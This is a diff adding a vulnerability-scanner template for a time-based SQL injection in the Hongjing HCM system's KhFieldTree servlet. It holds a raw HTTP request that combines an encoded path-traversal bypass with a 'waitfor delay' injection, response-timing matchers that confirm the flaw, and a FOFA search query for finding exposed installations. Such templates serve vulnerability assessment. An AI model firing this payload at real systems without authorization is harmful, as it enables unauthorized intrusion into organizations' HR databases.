@@ -1,0 +1,34 @@
+id: hjsoft-khfieldtree-sqli
+
+info:
+  name: 宏景 HCM 系统 KhFieldTree - sqli
+  author: leadlife
+  severity: high
+  description:
+  reference:
+    - https://github.com/MD-SEC/MDPOCS/blob/4de61fc965525a3f6af6049ef28d0b1619a649c1/Hongjing_HCM_KhFieldtree_Sql_Poc.py#L46
+  metadata:
+    verified: true
+    fofa-query: app="HJSOFT-HCM"
+    hunter-query: demo
+  tags: hjsoft,time,sqli,hcm
+
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        GET /templates/attestation/.%2e/.%2e/servlet/performance/KhFieldTree?pointsetid=-1&subsys_id=1';waitfor+delay+'0:0:6'+-- HTTP/1.1 
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
